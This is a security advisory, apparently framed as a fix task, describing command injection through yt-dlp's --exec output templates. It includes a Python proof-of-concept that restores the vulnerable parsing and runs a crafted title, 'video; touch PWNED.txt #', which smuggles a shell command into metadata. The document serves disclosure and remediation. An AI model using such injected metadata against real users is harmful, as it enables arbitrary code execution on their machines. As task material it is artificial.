# Security finding

> A code-security scan flagged the vulnerability below. No remediation is included; produce the fix yourself.

**Type:** OS Command Injection — CWE-78
**Project:** `yt-dlp/yt-dlp`
**Primary location:** `yt_dlp/YoutubeDL.py`
**Other files possibly involved:** `yt_dlp/__init__.py`, `yt_dlp/options.py`, `yt_dlp/postprocessor/exec.py`, `yt_dlp/utils/_utils.py`

## Details

### Summary
yt-dlp's `--exec` option is vulnerable to arbitrary command injection when handling untrusted metadata if the argument uses standard string formatting (e.g. `%(title)s`) or other unsafe conversions. An attacker could achieve remote code execution on the user's machine via maliciously crafted metadata containing quotes or other special shell characters.

### Details
Since yt-dlp version 2021.04.11, the `--exec` option has supported "output template syntax", which is a superset of Python's `printf`-style string formatting also used by the `--output` option. This means the user is able to pass a "command template" as an argument to the `--exec` option which will be executed by the user's shell. The command template allows for the downloaded video's metadata to be interpolated into the command string.

yt-dlp implements a `%()q` conversion, which will shell-quote/escape any metadata value such that it is safe to be interpolated into a command string. However, there are unsafe conversions such as `%()s` which result in the command template being formatted with the raw metadata string. These unsafe conversions do not perform any sanitization or escaping for shell contexts. If one or more of these unsafe conversions is used in the command template, an attacker can craft a malicious metadata value containing shell operators (e.g. `;`, `&`, `|`) to break out of the intended command and execute payload commands.

### Impact

The impact is limited to users who pass an `--exec` command template containing unsafe conversions in their yt-dlp command or configuration file: `%()s`, `%()a`, `%()r`, `%()j`, `%()S` (including any of their flagged variants.)

### Proof-of-Concept

1. An attacker sets the title of a video to a malicious payload, e.g.: `video; touch pwned.txt #`
2. The victim downloads this video using yt-dlp with the `--exec` flag.

Reproduction steps (simulated):
1.  Create a python script poc.py to simulate the internal behavior:

```bash
import unittest
import os

from yt_dlp.postprocessor.exec import ExecPP
from yt_dlp.YoutubeDL import YoutubeDL
from yt_dlp.utils import PostProcessingError

# Import Popen to use the REAL one for the PoC (to actually create the file)
from yt_dlp.utils import Popen as RealPopen

class TestDemonstrativePoC(unittest.TestCase):
    FILE_NAME = "PWNED.txt"

    def setUp(self):
        # Remove the file if it exists
        if os.path.exists(self.FILE_NAME):
            os.remove(self.FILE_NAME)

    def test_1_demonstrate_vulnerability_simulated(self):
        """
        """
        print("\n--- TEST 1: Simulating vulnerable state ---")

        # 1. Define the vulnerable Parse Method
        def vulnerable_parse_cmd(self, cmd, info):
            # This mimics the code before my patch
            tmpl, tmpl_dict = self._downloader.prepare_outtmpl(cmd, info)
            if tmpl_dict:
                return self._downloader.escape_outtmpl(tmpl) % tmpl_dict
            return cmd

        # 2. Patch the class temporarily
        original_parse_cmd = ExecPP.parse_cmd
        ExecPP.parse_cmd = vulnerable_parse_cmd

        info = {
            'id': '1234',
            # MALICIOUS TITLE:
            # 1. 'video' gets echoed
            # 2. ; separator
            # 3. touch PWNED.txt creates the file
            # 4. # comments out the rest
            'title': f'video; touch {self.FILE_NAME} #',
            'ext': 'mp4',
            'filepath': 'video.mp4'
        }

        ydl = YoutubeDL({'verbose': False, 'quiet': True})

        try:
            print(f"[*] Payload Title: {info['title']}")
            print("[*] Executing: echo %(title)s")

            # Use the REAL Popen to actually execute shell commands
            import yt_dlp.postprocessor.exec
            original_popen_ref = yt_dlp.postprocessor.exec.Popen
            yt_dlp.postprocessor.exec.Popen = RealPopen

            pp = ExecPP(ydl, 'echo %(title)s')
            pp.run(info)

            # Restore Popen ref
            yt_dlp.postprocessor.exec.Popen = original_popen_ref

            # Check if file was created
            if os.path.exists(self.FILE_NAME):
                print(f"[!] VULNERABILITY CONFIRMED: File '{self.FILE_NAME}' was created on disk!")
            else:
                print("[?] File not created. Payload might have failed.")

        finally:
            # Restore the secure method
            ExecPP.parse_cmd = original_parse_cmd

if __name__ == '__main__':
    unittest.main()
```
2. Run the script: `python3 poc.py`
3. Check the directory. A file named `PWNED.txt` will be created, proving arbitrary command execution.

<img width="1386" height="757" alt="poc" src="https://github.com/user-attachments/assets/b21a1dd9-f86d-4836-861b-7e880f639c08" />
